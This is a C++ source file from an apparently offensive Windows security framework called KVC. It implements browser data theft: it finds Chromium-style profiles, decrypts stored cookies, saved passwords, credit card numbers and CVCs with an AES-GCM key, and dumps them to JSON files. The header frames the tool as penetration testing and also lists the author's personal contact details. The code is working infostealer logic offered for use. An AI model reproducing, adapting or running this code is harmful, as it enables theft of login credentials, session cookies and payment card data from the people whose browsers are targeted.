/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// DataExtraction.cpp - Profile discovery and database extraction
#include "DataExtraction.h"
#include "BrowserCrypto.h"
#include "CommunicationModule.h"
#include <fstream>
#include <sstream>
#include <algorithm>

namespace SecurityComponents
{
    namespace Data
    {
        // Pre-loads CVC data for payment card processing
        std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> SetupPaymentCards(sqlite3* db)
        {
            auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                return cvcMap;
            
            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 1));
                if (guid && blob)
                    (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
            }
            sqlite3_finalize(stmt);
            return cvcMap;
        }

        // Formats cookie row into JSON
        std::optional<std::string> FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 6));
            if (!blob) return std::nullopt;
            
            auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
            if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                return std::nullopt;

            const char* value_start = reinterpret_cast<const char*>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
            size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;

            std::ostringstream json_entry;
            json_entry << "  {\"host\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))) << "\""
                      << ",\"name\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) << "\""
                      << ",\"path\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2))) << "\""
                      << ",\"value\":\"" << Utils::EscapeJson({value_start, value_size}) << "\""
                      << ",\"expires\":" << sqlite3_column_int64(stmt, 5)
                      << ",\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false")
                      << ",\"httpOnly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false")
                      << "}";
            return json_entry.str();
        }

        // Formats password row into JSON
        std::optional<std::string> FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 2));
            if (!blob) return std::nullopt;
            
            auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
            return "  {\"origin\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))) +
                  "\",\"username\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) +
                  "\",\"password\":\"" + Utils::EscapeJson({reinterpret_cast<char*>(plain.data()), plain.size()}) + "\"}";
        }

        // Formats payment card row into JSON
        std::optional<std::string> FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            auto cvcMap = reinterpret_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>*>(state);
            std::string card_num_str, cvc_str;
            
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 4));
            if (blob)
            {
                auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                card_num_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
            }
            
            const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
            if (guid && cvcMap && (*cvcMap)->count(guid))
            {
                auto plain = Crypto::DecryptGcm(key, (*cvcMap)->at(guid));
                cvc_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
            }
            
            return "  {\"name_on_card\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) +
                  "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                  ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                  ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                  "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
        }

        // Returns all extraction configurations
        const std::vector<ExtractionConfig>& GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                {fs::path("Network") / "Cookies", "cookies", 
                 "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr, FormatCookie},
                
                {"Login Data", "passwords", 
                 "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr, FormatPassword},

                {"Web Data", "payments", 
                 "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 SetupPaymentCards, FormatPayment}
            };
            return configs;
        }
    }

    // ProfileEnumerator implementation
    ProfileEnumerator::ProfileEnumerator(const fs::path& userDataRoot, PipeLogger& logger) 
        : m_userDataRoot(userDataRoot), m_logger(logger) {}

    std::vector<fs::path> ProfileEnumerator::FindProfiles()
    {
        m_logger.Log("[*] Discovering browser profiles in: " + StringUtils::path_to_string(m_userDataRoot));
        std::vector<fs::path> profilePaths;

        auto isProfileDirectory = [](const fs::path& path)
        {
            for (const auto& dataCfg : Data::GetExtractionConfigs())
            {
                if (fs::exists(path / dataCfg.dbRelativePath))
                    return true;
            }
            return false;
        };

        if (isProfileDirectory(m_userDataRoot))
        {
            profilePaths.push_back(m_userDataRoot);
        }

        std::error_code ec;
        for (const auto& entry : fs::directory_iterator(m_userDataRoot, ec))
        {
            if (!ec && entry.is_directory() && isProfileDirectory(entry.path()))
            {
                profilePaths.push_back(entry.path());
            }
        }

        if (ec)
        {
            m_logger.Log("[-] Filesystem ERROR during profile discovery: " + ec.message());
        }

        std::sort(profilePaths.begin(), profilePaths.end());
        profilePaths.erase(std::unique(profilePaths.begin(), profilePaths.end()), profilePaths.end());

        m_logger.Log("[+] Found " + std::to_string(profilePaths.size()) + " profile(s).");
        return profilePaths;
    }

    // DataExtractor implementation
    DataExtractor::DataExtractor(const fs::path& profilePath, const Data::ExtractionConfig& config,
                  const std::vector<uint8_t>& aesKey, PipeLogger& logger,
                  const fs::path& baseOutputPath, const std::string& browserName)
        : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
          m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}

    void DataExtractor::Extract()
    {
        fs::path dbPath = m_profilePath / m_config.dbRelativePath;
        if (!fs::exists(dbPath))
            return;

        sqlite3* db = nullptr;
        std::string uriPath = "file:" + StringUtils::path_to_string(dbPath) + "?nolock=1";
        std::replace(uriPath.begin(), uriPath.end(), '\\', '/');

        if (sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
        {
            m_logger.Log("[-] Failed to open database " + StringUtils::path_to_string(dbPath) + 
                       ": " + (db ? sqlite3_errmsg(db) : "N/A"));
            if (db) sqlite3_close_v2(db);
            return;
        }

        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
        {
            sqlite3_close_v2(db);
            return;
        }

        void* preQueryState = nullptr;
        std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> cvcMap;
        if (m_config.preQuerySetup)
        {
            cvcMap = m_config.preQuerySetup(db);
            preQueryState = &cvcMap;
        }

        std::vector<std::string> jsonEntries;
        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            if (auto jsonEntry = m_config.jsonFormatter(stmt, m_aesKey, preQueryState))
            {
                jsonEntries.push_back(*jsonEntry);
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close_v2(db);

        if (!jsonEntries.empty())
        {
            fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / 
                                 (m_config.outputFileName + ".json");
            
            std::error_code ec;
            fs::create_directories(outFilePath.parent_path(), ec);
            if (ec)
            {
                m_logger.Log("[-] Failed to create directory: " + StringUtils::path_to_string(outFilePath.parent_path()));
                return;
            }

            std::ofstream out(outFilePath, std::ios::trunc);
            if (!out) return;

            out << "[\n";
            for (size_t i = 0; i < jsonEntries.size(); ++i)
            {
                out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
            }
            out << "\n]\n";

            m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + 
                       " extracted to " + StringUtils::path_to_string(outFilePath));
        }
    }
}